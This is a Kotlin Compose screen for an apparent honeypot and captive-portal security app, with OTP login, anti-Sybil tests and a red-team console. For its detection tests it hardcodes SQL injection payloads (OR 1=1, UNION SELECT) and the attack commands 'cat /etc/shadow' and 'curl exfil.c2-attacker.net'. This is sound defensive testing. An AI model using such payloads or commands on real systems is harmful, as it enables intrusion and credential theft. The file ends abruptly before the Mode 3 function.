package com.example.ui.screens

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.data.local.entity.HoneygateConfigEntity
import com.example.data.repository.Mode1AuthResult
import com.example.data.repository.Mode2ActionResult
import com.example.data.repository.OtpChallenge
import com.example.data.repository.SqlInjectionResult
import com.example.ui.theme.*

@Composable
fun HoneygateScreen(
  config: HoneygateConfigEntity,
  mode1Result: Mode1AuthResult?,
  mode2Result: Mode2ActionResult?,
  otpChallenge: OtpChallenge?,
  sqlInjectionResult: SqlInjectionResult?,
  redTeamLogs: List<String>,
  escalationLevel: String,
  onSaveConfig: (HoneygateConfigEntity) -> Unit,
  onRegisterMode1: (email: String, ip: String, mac: String) -> Unit,
  onRequestOtp: (email: String, ip: String, mac: String) -> Unit,
  onVerifyOtp: (code: String, ip: String, mac: String) -> Boolean,
  onDismissOtp: () -> Unit,
  onTestSqlInjection: (payload: String, ip: String, mac: String) -> Unit,
  onClearSqlInjection: () -> Unit,
  onRunRedTeamCommand: (canaryUser: String, command: String) -> Unit,
  onClearMode1Result: () -> Unit,
  onUpdateBranding: (name: String, primary: String, accent: String) -> Unit,
  onOpenDaemonSettings: () -> Unit = {}
) {
  var selectedGateMode by remember { mutableIntStateOf(config.gateMode) }

  Column(
    modifier = Modifier
      .fillMaxSize()
      .padding(horizontal = 14.dp, vertical = 8.dp)
  ) {
    // Selector de Modos de Operación (1: Cautivo Trazable, 2: Honeypot Red Team, 3: Mixto)
    Card(
      modifier = Modifier.fillMaxWidth(),
      shape = RoundedCornerShape(12.dp),
      colors = CardDefaults.cardColors(containerColor = DarkSurface),
      border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
    ) {
      Column(modifier = Modifier.padding(10.dp)) {
        Text("Modo Operativo Activo en HoneyGate", fontSize = 11.sp, color = TextSecondary)
        Spacer(modifier = Modifier.height(6.dp))
        Row(
          modifier = Modifier.fillMaxWidth(),
          horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
          GateModeTab(
            mode = 1,
            title = "Modo 1: Cautivo",
            isSelected = selectedGateMode == 1,
            onClick = {
              selectedGateMode = 1
              onSaveConfig(config.copy(gateMode = 1))
            },
            modifier = Modifier.weight(1f)
          )
          GateModeTab(
            mode = 2,
            title = "Modo 2: Honeypot",
            isSelected = selectedGateMode == 2,
            onClick = {
              selectedGateMode = 2
              onSaveConfig(config.copy(gateMode = 2))
            },
            modifier = Modifier.weight(1f)
          )
          GateModeTab(
            mode = 3,
            title = "Modo 3: Mixto",
            isSelected = selectedGateMode == 3,
            onClick = {
              selectedGateMode = 3
              onSaveConfig(config.copy(gateMode = 3))
            },
            modifier = Modifier.weight(1f)
          )
        }
      }
    }

    Spacer(modifier = Modifier.height(10.dp))

    // Contenido del Modo seleccionado
    when (selectedGateMode) {
      1 -> Mode1CaptivePortalScreen(
        config = config,
        authResult = mode1Result,
        otpChallenge = otpChallenge,
        sqlInjectionResult = sqlInjectionResult,
        onSaveConfig = onSaveConfig,
        onRegister = onRegisterMode1,
        onRequestOtp = onRequestOtp,
        onVerifyOtp = onVerifyOtp,
        onDismissOtp = onDismissOtp,
        onTestSqlInjection = onTestSqlInjection,
        onClearSqlInjection = onClearSqlInjection,
        onClearResult = onClearMode1Result,
        onUpdateBranding = onUpdateBranding
      )
      2 -> Mode2HoneypotRedTeamScreen(
        config = config,
        redTeamLogs = redTeamLogs,
        escalationLevel = escalationLevel,
        actionResult = mode2Result,
        onSaveConfig = onSaveConfig,
        onRunCommand = onRunRedTeamCommand
      )
      3 -> Mode3MixedScenarioScreen(
        config = config,
        redTeamLogs = redTeamLogs,
        onSaveConfig = onSaveConfig,
        onOpenDaemonSettings = onOpenDaemonSettings
      )
    }
  }
}

@Composable
fun GateModeTab(
  mode: Int,
  title: String,
  isSelected: Boolean,
  onClick: () -> Unit,
  modifier: Modifier = Modifier
) {
  val (color, bg) = when (mode) {
    1 -> CyberGreen to GreenGlow
    2 -> AlertRed to RedGlow
    else -> CyberCyan to CyanGlow
  }

  Surface(
    modifier = modifier
      .clickable(onClick = onClick)
      .testTag("gate_mode_tab_$mode"),
    shape = RoundedCornerShape(8.dp),
    color = if (isSelected) bg else DarkSurfaceVariant,
    border = androidx.compose.foundation.BorderStroke(1.dp, if (isSelected) color else DarkBorder)
  ) {
    Box(
      modifier = Modifier.padding(vertical = 8.dp, horizontal = 4.dp),
      contentAlignment = Alignment.Center
    ) {
      Text(
        text = title,
        color = if (isSelected) color else TextSecondary,
        fontSize = 11.sp,
        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal,
        maxLines = 1
      )
    }
  }
}

// =============================================================================
// MODO 1: PORTAL CAUTIVO CON TRAZABILIDAD Y PERSONALIZACIÓN DE MARCA
// =============================================================================
@Composable
fun Mode1CaptivePortalScreen(
  config: HoneygateConfigEntity,
  authResult: Mode1AuthResult?,
  otpChallenge: OtpChallenge?,
  sqlInjectionResult: SqlInjectionResult?,
  onSaveConfig: (HoneygateConfigEntity) -> Unit,
  onRegister: (String, String, String) -> Unit,
  onRequestOtp: (String, String, String) -> Unit,
  onVerifyOtp: (String, String, String) -> Boolean,
  onDismissOtp: () -> Unit,
  onTestSqlInjection: (String, String, String) -> Unit,
  onClearSqlInjection: () -> Unit,
  onClearResult: () -> Unit,
  onUpdateBranding: (String, String, String) -> Unit
) {
  var emailInput by remember { mutableStateOf("") }
  var otpInput by remember { mutableStateOf("") }
  var otpError by remember { mutableStateOf(false) }
  var ipInput by remember { mutableStateOf("192.168.1.105") }
  var macInput by remember { mutableStateOf("52:54:00:12:34:56") }

  // Branding Customizer State
  var isBrandingExpanded by remember { mutableStateOf(false) }
  var companyNameInput by remember { mutableStateOf(config.companyName) }
  var selectedPrimaryColor by remember { mutableStateOf(config.primaryColorHex) }
  var selectedAccentColor by remember { mutableStateOf(config.accentColorHex) }

  LazyColumn(
    modifier = Modifier.fillMaxSize(),
    verticalArrangement = Arrangement.spacedBy(10.dp),
    contentPadding = PaddingValues(bottom = 24.dp)
  ) {
    // 1. Personalización de Diseño y Branding del Portal Cautivo
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, CyberCyan.copy(alpha = 0.5f))
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Row(
            modifier = Modifier
              .fillMaxWidth()
              .clickable { isBrandingExpanded = !isBrandingExpanded },
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
          ) {
            Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
              Box(
                modifier = Modifier
                  .size(30.dp)
                  .clip(RoundedCornerShape(6.dp))
                  .background(CyanGlow)
                  .border(1.dp, CyberCyan, RoundedCornerShape(6.dp)),
                contentAlignment = Alignment.Center
              ) {
                Icon(Icons.Default.Palette, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(16.dp))
              }
              Column {
                Text("Diseño y Marca del Portal (Honeygate)", fontWeight = FontWeight.Bold, color = TextPrimary, fontSize = 12.sp)
                Text("Logo, nombre corporativo y colores de la empresa", fontSize = 10.sp, color = TextSecondary)
              }
            }
            Icon(
              imageVector = if (isBrandingExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
              contentDescription = null,
              tint = TextSecondary
            )
          }

          AnimatedVisibility(visible = isBrandingExpanded) {
            Column(modifier = Modifier.padding(top = 10.dp)) {
              OutlinedTextField(
                value = companyNameInput,
                onValueChange = {
                  companyNameInput = it
                  onUpdateBranding(companyNameInput, selectedPrimaryColor, selectedAccentColor)
                },
                label = { Text("Nombre de la Empresa", fontSize = 11.sp) },
                modifier = Modifier.fillMaxWidth().testTag("company_name_input"),
                singleLine = true,
                textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = TextPrimary)
              )

              Spacer(modifier = Modifier.height(8.dp))
              Text("Paleta de Color Principal:", fontSize = 10.sp, color = TextSecondary)
              Spacer(modifier = Modifier.height(4.dp))
              Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                listOf("#10B981" to "Esmeralda", "#06B6D4" to "Cian", "#8B5CF6" to "Violeta", "#F59E0B" to "Ámbar").forEach { (hex, name) ->
                  val isSelected = selectedPrimaryColor == hex
                  val colorObj = Color(android.graphics.Color.parseColor(hex))
                  Surface(
                    shape = RoundedCornerShape(6.dp),
                    color = if (isSelected) colorObj.copy(alpha = 0.2f) else DarkSurfaceVariant,
                    border = androidx.compose.foundation.BorderStroke(if (isSelected) 1.5.dp else 1.dp, if (isSelected) colorObj else DarkBorder),
                    modifier = Modifier.clickable {
                      selectedPrimaryColor = hex
                      onUpdateBranding(companyNameInput, selectedPrimaryColor, selectedAccentColor)
                    }
                  ) {
                    Row(modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                      Box(modifier = Modifier.size(8.dp).clip(CircleShape).background(colorObj))
                      Spacer(modifier = Modifier.width(4.dp))
                      Text(name, fontSize = 10.sp, color = if (isSelected) colorObj else TextSecondary, fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal)
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    // 2. Aviso Legal Invariante 4 (Ley 25.326 y Ley 26.388)
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF131B26)),
        border = androidx.compose.foundation.BorderStroke(1.dp, CyanGlow)
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            Icon(Icons.Default.Gavel, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(16.dp))
            Text("Aviso Legal y Consentimiento (Invariante 4)", fontWeight = FontWeight.Bold, color = CyberCyan, fontSize = 11.sp)
          }
          Spacer(modifier = Modifier.height(4.dp))
          Text(
            "Conforme a la Ley 25.326 (AR), se recopilan exclusivamente METADATOS de sesión (origen, duración y device_id) con fines de seguridad de red. Uso exclusivo en redes autorizadas (Ley 26.388).",
            fontSize = 10.sp,
            color = TextSecondary,
            lineHeight = 14.sp
          )
        }
      }
    }

    // 3. Identificadores y Fingerprint Compuesto (Invariante 1)
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Text("Invariante 1: Identificación por Fingerprint Compuesto", fontWeight = FontWeight.Bold, color = TextPrimary, fontSize = 12.sp)
          Text("No dependiente de MAC/IP solas. Integra MAC-por-SSID + Browser Canvas + JA3 + DHCP.", fontSize = 10.sp, color = TextMuted)
          Spacer(modifier = Modifier.height(8.dp))
          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
              value = ipInput,
              onValueChange = { ipInput = it },
              label = { Text("IP Detectada", fontSize = 10.sp) },
              modifier = Modifier.weight(1f),
              singleLine = true,
              textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
            )
            OutlinedTextField(
              value = macInput,
              onValueChange = { macInput = it },
              label = { Text("MAC Física", fontSize = 10.sp) },
              modifier = Modifier.weight(1.2f),
              singleLine = true,
              textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
            )
          }
        }
      }
    }

    // 4. Portal Cautivo con Validación de Clave Numérica (OTP) o Registro Directo
    item {
      val brandColor = Color(android.graphics.Color.parseColor(config.primaryColorHex))
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, brandColor.copy(alpha = 0.5f))
      ) {
        Column(modifier = Modifier.padding(14.dp)) {
          Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Icon(Icons.Default.Security, contentDescription = null, tint = brandColor, modifier = Modifier.size(20.dp))
            Column {
              Text(config.companyName, fontWeight = FontWeight.Bold, color = brandColor, fontSize = 14.sp)
              Text("Portal Cautivo de Autenticación & Trazabilidad", fontSize = 10.sp, color = TextSecondary)
            }
          }
          Spacer(modifier = Modifier.height(10.dp))

          OutlinedTextField(
            value = emailInput,
            onValueChange = { emailInput = it },
            label = { Text("Correo Electrónico (Identificador de Sesión)", fontSize = 11.sp) },
            modifier = Modifier.fillMaxWidth().testTag("mode1_email_input"),
            singleLine = true,
            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = TextPrimary)
          )

          Spacer(modifier = Modifier.height(10.dp))

          // Flujo de Clave Numérica por Email (OTP)
          if (otpChallenge == null) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
              Button(
                onClick = {
                  if (emailInput.isNotBlank()) {
                    onRequestOtp(emailInput, ipInput, macInput)
                  }
                },
                colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = Color.Black),
                modifier = Modifier.weight(1f).height(38.dp).testTag("mode1_send_otp_button")
              ) {
                Icon(Icons.Default.Pin, contentDescription = null, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(4.dp))
                Text("Enviar Clave al Mail", fontSize = 10.sp, fontWeight = FontWeight.Bold)
              }

              OutlinedButton(
                onClick = {
                  if (emailInput.isNotBlank()) {
                    onRegister(emailInput, ipInput, macInput)
                  }
                },
                colors = ButtonDefaults.outlinedButtonColors(contentColor = brandColor),
                border = androidx.compose.foundation.BorderStroke(1.dp, brandColor),
                modifier = Modifier.weight(1f).height(38.dp).testTag("mode1_register_button")
              ) {
                Text("Registro Directo", fontSize = 10.sp, fontWeight = FontWeight.Bold)
              }
            }
          } else {
            // Desafío OTP Activo
            Surface(
              shape = RoundedCornerShape(8.dp),
              color = CyanGlow,
              border = androidx.compose.foundation.BorderStroke(1.dp, CyberCyan),
              modifier = Modifier.fillMaxWidth()
            ) {
              Column(modifier = Modifier.padding(10.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                  Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    Icon(Icons.Default.Email, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(16.dp))
                    Text("Clave Numérica Enviada a ${otpChallenge.email}", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CyberCyan)
                  }
                  IconButton(onClick = onDismissOtp, modifier = Modifier.size(18.dp)) {
                    Icon(Icons.Default.Close, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(12.dp))
                  }
                }
                Text("Simulación de clave: [ ${otpChallenge.code} ] (Código de 6 dígitos)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
                Spacer(modifier = Modifier.height(6.dp))

                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                  OutlinedTextField(
                    value = otpInput,
                    onValueChange = {
                      otpInput = it
                      otpError = false
                    },
                    label = { Text("Ingresar Clave Numérica (PIN)", fontSize = 10.sp) },
                    modifier = Modifier.weight(1f).testTag("otp_code_input"),
                    singleLine = true,
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
                  )
                  Button(
                    onClick = {
                      val success = onVerifyOtp(otpInput, ipInput, macInput)
                      if (!success) {
                        otpError = true
                      }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = CyberGreen, contentColor = Color.Black),
                    modifier = Modifier.height(52.dp).testTag("verify_otp_button")
                  ) {
                    Text("Validar", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                  }
                }

                if (otpError) {
                  Spacer(modifier = Modifier.height(4.dp))
                  Text("⚠️ Clave numérica incorrecta. Intento registrado en bitácora.", fontSize = 9.sp, color = AlertRed, fontWeight = FontWeight.Bold)
                }
              }
            }
          }

          authResult?.let { res ->
            Spacer(modifier = Modifier.height(10.dp))
            val (badgeBg, badgeColor) = if (res.inObservation) AmberGlow to WarningAmber else GreenGlow to CyberGreen
            Surface(
              shape = RoundedCornerShape(8.dp),
              color = badgeBg,
              border = androidx.compose.foundation.BorderStroke(1.dp, badgeColor),
              modifier = Modifier.fillMaxWidth()
            ) {
              Column(modifier = Modifier.padding(10.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                  Text(if (res.inObservation) "EN OBSERVACIÓN (Anti-Sybil)" else "REGISTRO NOMINAL", fontWeight = FontWeight.Bold, color = badgeColor, fontSize = 11.sp)
                  IconButton(onClick = onClearResult, modifier = Modifier.size(18.dp)) {
                    Icon(Icons.Default.Close, contentDescription = null, tint = badgeColor, modifier = Modifier.size(12.dp))
                  }
                }
                Spacer(modifier = Modifier.height(2.dp))
                Text(res.message, fontSize = 11.sp, color = TextPrimary)
                Text("device_id asignado: ${res.deviceId}", fontSize = 9.sp, color = TextMuted, fontFamily = FontFamily.Monospace)
              }
            }
          }
        }
      }
    }

    // 5. Auditoría de Inyección SQL (Validación de Clave con Usuario no Registrado)
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, WarningAmber.copy(alpha = 0.5f))
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            Icon(Icons.Default.BugReport, contentDescription = null, tint = WarningAmber, modifier = Modifier.size(16.dp))
            Text("Auditoría: Detección de Inyección SQL (SQLi)", fontWeight = FontWeight.Bold, color = WarningAmber, fontSize = 11.sp)
          }
          Spacer(modifier = Modifier.height(4.dp))
          Text(
            "Si un atacante inyecta SQL al validar la clave: se verifica la MAC y sus IPs asignadas, se mantiene la correlación activa navegando y se notifica al panel de administración para bloqueo.",
            fontSize = 10.sp,
            color = TextSecondary,
            lineHeight = 14.sp
          )
          Spacer(modifier = Modifier.height(8.dp))

          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            Button(
              onClick = {
                onTestSqlInjection("' OR '1'='1' --", ipInput, macInput)
              },
              colors = ButtonDefaults.buttonColors(containerColor = WarningAmber, contentColor = Color.Black),
              modifier = Modifier.weight(1f).height(32.dp).testTag("sqli_test_button")
            ) {
              Text("Inyectar ' OR '1'='1", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }

            Button(
              onClick = {
                onTestSqlInjection("admin' UNION SELECT null, mac, ip FROM sessions--", ipInput, macInput)
              },
              colors = ButtonDefaults.buttonColors(containerColor = AlertRed, contentColor = Color.White),
              modifier = Modifier.weight(1f).height(32.dp)
            ) {
              Text("Inyectar UNION SELECT", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
          }

          sqlInjectionResult?.let { sqli ->
            Spacer(modifier = Modifier.height(8.dp))
            Surface(
              shape = RoundedCornerShape(8.dp),
              color = RedGlow,
              border = androidx.compose.foundation.BorderStroke(1.dp, AlertRed),
              modifier = Modifier.fillMaxWidth()
            ) {
              Column(modifier = Modifier.padding(10.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                  Text("🚨 ALERTA AL ADMINISTRADOR: SQLi DETECTADA", fontWeight = FontWeight.Bold, color = AlertRed, fontSize = 10.sp)
                  IconButton(onClick = onClearSqlInjection, modifier = Modifier.size(16.dp)) {
                    Icon(Icons.Default.Close, contentDescription = null, tint = AlertRed, modifier = Modifier.size(12.dp))
                  }
                }
                Text(sqli.alertMessage, fontSize = 10.sp, color = TextPrimary, lineHeight = 14.sp)
                Text("• Correlación: MAC ${sqli.correlatedMac} <-> IP ${sqli.correlatedIp}", fontSize = 9.sp, color = CyberCyan, fontFamily = FontFamily.Monospace)
                Text("• Navegación monitorizada activa (sin corte brusco)", fontSize = 9.sp, color = WarningAmber)
              }
            }
          }
        }
      }
    }

    // 6. Pruebas Anti-Sybil y Reglas de Velocidad
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          Text("Pruebas de Detección Anti-Sybil (Reglas de Velocidad)", fontWeight = FontWeight.Bold, color = CyberGreen, fontSize = 11.sp)
          Text("Valida detección de dominios desechables y rotación de cuentas sin bloquear de una.", fontSize = 10.sp, color = TextMuted)
          Spacer(modifier = Modifier.height(8.dp))

          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            Button(
              onClick = {
                emailInput = "spammer@tempmail.com"
                onRegister(emailInput, ipInput, macInput)
              },
              colors = ButtonDefaults.buttonColors(containerColor = WarningAmber, contentColor = Color.Black),
              modifier = Modifier.weight(1f).height(34.dp)
            ) {
              Text("Mail Desechable", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }

            Button(
              onClick = {
                emailInput = "cuenta_sybil_${System.currentTimeMillis() % 100}@mail.com"
                onRegister(emailInput, ipInput, macInput)
              },
              colors = ButtonDefaults.buttonColors(containerColor = WarningAmber, contentColor = Color.Black),
              modifier = Modifier.weight(1f).height(34.dp)
            ) {
              Text("Mismo device_id N Mails", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
          }
        }
      }
    }
  }
}

// =============================================================================
// MODO 2: HONEYPOT (AUDITORÍA PARA UN CLIENTE / RED TEAM)
// =============================================================================
@Composable
fun Mode2HoneypotRedTeamScreen(
  config: HoneygateConfigEntity,
  redTeamLogs: List<String>,
  escalationLevel: String,
  actionResult: Mode2ActionResult?,
  onSaveConfig: (HoneygateConfigEntity) -> Unit,
  onRunCommand: (String, String) -> Unit
) {
  var commandText by remember { mutableStateOf("") }
  var canaryUsers by remember { mutableStateOf(config.honeytokenUsersCsv) }
  var egressContained by remember { mutableStateOf(config.strictEgressContainment) }
  val activeCanaryUser = canaryUsers.split(",").firstOrNull()?.trim() ?: "cfo_canary@honeygate.corp"

  LazyColumn(
    modifier = Modifier.fillMaxSize(),
    verticalArrangement = Arrangement.spacedBy(10.dp),
    contentPadding = PaddingValues(bottom = 24.dp)
  ) {
    // Invariante 2: Contención de Salida (Data Control)
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, AlertRed.copy(alpha = 0.4f))
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
          ) {
            Column(modifier = Modifier.weight(1f)) {
              Text("Invariante 2: Contención de Salida (Data Control)", fontWeight = FontWeight.Bold, color = AlertRed, fontSize = 11.sp)
              Text("El honeypot NUNCA tiene salida libre. Redirigida a Sinkhole / Whitelist estricta.", fontSize = 10.sp, color = TextSecondary)
            }
            Switch(
              checked = egressContained,
              onCheckedChange = {
                egressContained = it
                onSaveConfig(config.copy(strictEgressContainment = it))
              },
              colors = SwitchDefaults.colors(checkedThumbColor = AlertRed, checkedTrackColor = RedGlow)
            )
          }
        }
      }
    }

    // Invariante 3: Honeytokens sembrados y Canary Users
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Text("Invariante 3: Honeytokens y Canary Users (Assume-Breach)", fontWeight = FontWeight.Bold, color = WarningAmber, fontSize = 11.sp)
          Text("Datos señuelo estrictamente controlados por el operador (nunca personas reales).", fontSize = 10.sp, color = TextMuted)
          Spacer(modifier = Modifier.height(6.dp))
          Text("• Sectores Comprometidos: ${config.compromisedSectorsCsv}", fontSize = 10.sp, color = TextPrimary)
          Text("• Canary Users: ${config.honeytokenUsersCsv}", fontSize = 10.sp, color = CyberCyan, fontFamily = FontFamily.Monospace)
          Text("• Honeytokens en Secreto: ${config.honeytokenSecretsCsv}", fontSize = 10.sp, color = AlertRed, fontFamily = FontFamily.Monospace)
        }
      }
    }

    // Servicios Emulados (Seguros por defecto)
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Text("Servicios Ficticios Emulados (Seguros)", fontWeight = FontWeight.Bold, color = CyberGreen, fontSize = 11.sp)
          Spacer(modifier = Modifier.height(6.dp))
          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ServiceMiniTag("MySQL 3306", Modifier.weight(1f))
            ServiceMiniTag("Apache 8080", Modifier.weight(1f))
            ServiceMiniTag("SSH 2222", Modifier.weight(1f))
            ServiceMiniTag("Telnet 2323", Modifier.weight(1f))
          }
        }
      }
    }

    // Consola de TTPs del Red Team
    item {
      Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF090D14)),
        border = androidx.compose.foundation.BorderStroke(1.dp, DarkBorder)
      ) {
        Column(modifier = Modifier.padding(10.dp)) {
          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
            Text("Consola de Comandos Red Team", fontWeight = FontWeight.Bold, color = TextPrimary, fontSize = 11.sp)
            Text(escalationLevel, fontSize = 10.sp, color = AlertRed, fontWeight = FontWeight.Bold)
          }
          Spacer(modifier = Modifier.height(6.dp))

          Box(
            modifier = Modifier
              .fillMaxWidth()
              .height(120.dp)
              .clip(RoundedCornerShape(6.dp))
              .background(Color.Black)
              .padding(8.dp)
          ) {
            LazyColumn(modifier = Modifier.fillMaxSize()) {
              items(redTeamLogs) { line ->
                Text(
                  text = line,
                  color = if (line.contains("SINKHOLE") || line.contains("Honeytoken")) AlertRed else CyberGreen,
                  fontSize = 10.sp,
                  fontFamily = FontFamily.Monospace
                )
              }
            }
          }

          Spacer(modifier = Modifier.height(8.dp))

          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            OutlinedTextField(
              value = commandText,
              onValueChange = { commandText = it },
              placeholder = { Text("Ej: sudo -l, cat /etc/shadow, curl attacker.c2", fontSize = 10.sp, color = TextMuted) },
              modifier = Modifier.weight(1f),
              singleLine = true,
              textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = CyberGreen)
            )

            Button(
              onClick = {
                if (commandText.isNotBlank()) {
                  onRunCommand(activeCanaryUser, commandText)
                  commandText = ""
                }
              },
              colors = ButtonDefaults.buttonColors(containerColor = AlertRed),
              modifier = Modifier.height(48.dp)
            ) {
              Text("Enviar", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
          }

          Spacer(modifier = Modifier.height(4.dp))

          Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(4.dp)) {
            SuggestionChip(
              onClick = { onRunCommand(activeCanaryUser, "cat /etc/shadow") },
              label = { Text("Tocar Honeytoken", fontSize = 9.sp, color = AlertRed) }
            )
            SuggestionChip(
              onClick = { onRunCommand(activeCanaryUser, "curl exfil.c2-attacker.net") },
              label = { Text("Exfiltración (Sinkhole)", fontSize = 9.sp, color = WarningAmber) }
            )
            SuggestionChip(
              onClick = { onRunCommand(activeCanaryUser, "sudo -l") },
              label = { Text("sudo -l", fontSize = 9.sp) }
            )
          }
        }
      }
    }
  }
}

@Composable
fun ServiceMiniTag(title: String, modifier: Modifier = Modifier) {
  Surface(
    shape = RoundedCornerShape(4.dp),
    color = GreenGlow,
    border = androidx.compose.foundation.BorderStroke(1.dp, CyberGreen.copy(alpha = 0.5f)),
    modifier = modifier
  ) {
    Box(modifier = Modifier.padding(4.dp), contentAlignment = Alignment.Center) {
      Text(title, fontSize = 9.sp, color = CyberGreen, maxLines = 1)
    }
  }
}

// =============================================================================
// MODO 3: MIXTO (UNIFICA 1 Y 2)
// =============================================================================
@Composable
